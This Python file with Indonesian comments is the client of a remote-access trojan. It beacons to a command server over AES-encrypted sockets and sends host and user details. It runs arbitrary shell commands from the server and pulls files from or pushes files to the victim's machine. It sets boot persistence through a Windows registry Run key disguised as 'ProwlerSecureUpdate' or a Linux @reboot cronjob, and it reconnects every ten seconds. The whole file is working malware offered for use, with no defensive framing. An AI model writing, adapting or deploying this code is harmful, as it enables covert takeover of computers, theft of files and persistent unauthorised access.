import os
import platform
import socket
import subprocess
import sys
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# KELOLA KONEKSI (Sesuaikan IP & Port Server kamu)
SERVER_IP = '127.0.0.1'  
SERVER_PORT = 9999

# Kunci Enkripsi AES (Harus sama persis dengan server)
AES_KEY = b'IniKunciRahasiaSangatPro12345678'

def encrypt_data(data_str):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
    padded_data = pad(data_str.encode('utf-8'), AES.block_size)
    return cipher.encrypt(padded_data)

def decrypt_data(data_bytes):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
        decrypted_padded = cipher.decrypt(data_bytes)
        return unpad(decrypted_padded, AES.block_size).decode('utf-8', errors='ignore')
    except Exception:
        return ""

def get_os_info():
    return f"{platform.system()} {platform.release()} | User: {os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'}"

def set_persistence():
    """ Mengatur program agar berjalan otomatis saat komputer menyala (Boot Persistence) """
    os_type = platform.system()
    current_file = os.path.abspath(sys.argv[0])
    
    try:
        if os_type == "Windows":
            import winreg as reg
            # Menyusup ke Registry Run Key milik pengguna saat ini
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
            reg.SetValueEx(reg_key, "ProwlerSecureUpdate", 0, reg.REG_SZ, f'"{sys.executable}" "{current_file}"')
            reg.CloseKey(reg_key)
            return "[+] Persistence Windows BERHASIL: Ditambahkan ke Registry HCU Run Key.\n"
            
        elif os_type == "Linux":
            # Menyusup menggunakan sistem penjadwalan Cronjob (@reboot)
            cron_cmd = f"@reboot {sys.executable} {current_file} >/dev/null 2>&1\n"
            cron_file = "/tmp/current_cron"
            
            # Ambil cronjob yang ada saat ini
            os.system(f"crontab -l > {cron_file} 2>/dev/null")
            
            # Cek jika perintah sudah terdaftar untuk menghindari duplikasi
            with open(cron_file, "r") as f:
                content = f.read()
                
            if current_file not in content:
                with open(cron_file, "a") as f:
                    f.write(cron_cmd)
                os.system(f"crontab {cron_file}")
                
            if os.path.exists(cron_file):
                os.remove(cron_file)
            return "[+] Persistence Linux BERHASIL: Ditambahkan ke Cronjob (@reboot).\n"
            
        else:
            return "[-] Persistence GAGAL: OS tidak didukung.\n"
    except Exception as e:
        return f"[-] Gagal mengaktifkan persistence: {str(e)}\n"

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_IP, SERVER_PORT))
        # Kirim data OS pertama kali dalam bentuk terenkripsi
        s.send(encrypt_data(get_os_info()))
    except socket.error:
        return None
    return s

def run_client():
    s = connect_to_server()
    if not s:
        return

    while True:
        try:
            raw_data = s.recv(4096)
            if not raw_data:
                break
                
            cmd = decrypt_data(raw_data)
            
            if cmd == 'ping':
                s.send(encrypt_data('pong'))
                continue
                
            if cmd == 'persistence':
                res = set_persistence()
                s.send(encrypt_data(res))
                continue

            # --- LOGIKA DOWNLOAD (Server minta file dari Client) ---
            if cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1]
                if os.path.exists(filename) and os.path.isfile(filename):
                    file_size = os.path.getsize(filename)
                    s.send(encrypt_data(f"READY:{file_size}"))
                    
                    with open(filename, "rb") as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            s.send(chunk)
                else:
                    s.send(encrypt_data("[-] File tidak ditemukan atau berupa direktori di target."))
                continue

            # --- LOGIKA UPLOAD (Server kirim file ke Client) ---
            elif cmd.startswith("upload "):
                filename = cmd.split(" ", 1)[1]
                
                # Terima status kesiapan dari server
                status = decrypt_data(s.recv(1024))
                if "READY" in status:
                    file_size = int(status.split(":")[1])
                    s.send(encrypt_data("START")) # Kirim sinyal siap terima bytes
                    
                    with open(filename, "wb") as f:
                        bytes_received = 0
                        while bytes_received < file_size:
                            chunk = s.recv(4096)
                            if not chunk: break
                            f.write(chunk)
                            bytes_received += len(chunk)
                    s.send(encrypt_data(f"\n[+] File {filename} berhasil diunggah ke target!\n"))
                continue

            # --- EKSEKUSI SHELL STANDARD ---
            if len(cmd) > 0:
                if platform.system() == "Windows":
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                else:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
                
                output_byte = proc.stdout.read() + proc.stderr.read()
                output_str = str(output_byte, "utf-8", errors="ignore")
                
                if output_str == "":
                    output_str = "\n[Perintah Berhasil Dieksekusi Tanpa Output]\n"
                
                s.send(encrypt_data(output_str))
        except Exception:
            break
            
    s.close()

if __name__ == '__main__':
    # Memastikan client melakukan reconnect otomatis secara konstan (Persistent Beacon)
    while True:
        try:
            run_client()
        except Exception:
            pass
        time.sleep(10)
